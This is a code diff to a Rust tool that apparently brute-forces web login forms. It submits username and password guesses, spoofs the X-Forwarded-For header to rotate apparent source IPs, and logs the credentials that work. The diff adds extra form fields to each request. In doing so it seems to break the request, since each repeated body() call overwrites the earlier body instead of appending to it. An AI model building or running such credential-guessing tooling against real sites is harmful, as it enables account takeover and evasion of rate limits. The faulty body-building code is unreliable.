@@ -16,6 +16,7 @@ pub struct FormParams {
     pub pass_field: String,
     pub invalid_text: Vec<String>,
     pub spoof: Option<u32>,
+    pub other_fields: Vec<String>,
 }
 
 pub fn brute_form(login_params: LoginParams, form_params: FormParams) {
@@ -30,7 +31,7 @@ pub fn brute_form(login_params: LoginParams, form_params: FormParams) {
     let user_field = form_params.user_field;
     let pass_field = form_params.pass_field;
     let invalid_text = form_params.invalid_text;
-
+    let other_fields = form_params.other_fields;
     if invalid_text.is_empty() {
         warn("Invalid Text is empty.");
     }
@@ -38,15 +39,23 @@ pub fn brute_form(login_params: LoginParams, form_params: FormParams) {
     // Submit one (user, pass) attempt; use a blocking client so we can run
     // synchronously from the worker threads in `search::run_search`.
     let submit = |user: &str, pass: &str| -> bool {
-        let mut builder = client.post(&url).header(CONTENT_TYPE, "text/html");
+        let mut builder = client.post(&url).header(
+            CONTENT_TYPE,
+            "application/x-www-form-urlencoded; charset=UTF-8",
+        );
 
         if let Some(spoofer) = &spoofer {
             builder = builder.header("X-Forwarded-For", spoofer.select_ip());
         }
 
-        let res = builder
-            .body(format!("{user_field}={user}&{pass_field}={pass}"))
-            .send();
+        builder = builder.body(format!("{user_field}={user}&{pass_field}={pass}"));
+
+        for field in &other_fields {
+            if let Some((key, value)) = field.split_once('=') {
+                builder = builder.body(format!("&{key}={value}"));
+            }
+        }
+        let res = builder.send();
 
         match res {
             Ok(r) => {
@@ -64,7 +73,9 @@ pub fn brute_form(login_params: LoginParams, form_params: FormParams) {
 
     let report = |user: &str, pass: &str| {
         OUTPUT_HANDLER.lock().unwrap().write_login(user, pass);
-        format!("[{GREEN}+{RESET}] Username: {GREEN}{user}{RESET} Password: {GREEN}{pass}{RESET}")
+        format!(
+            "[{GREEN}Form{RESET}] Username: {GREEN}{user}{RESET} Password: {GREEN}{pass}{RESET}"
+        )
     };
 
     let result = run_search(
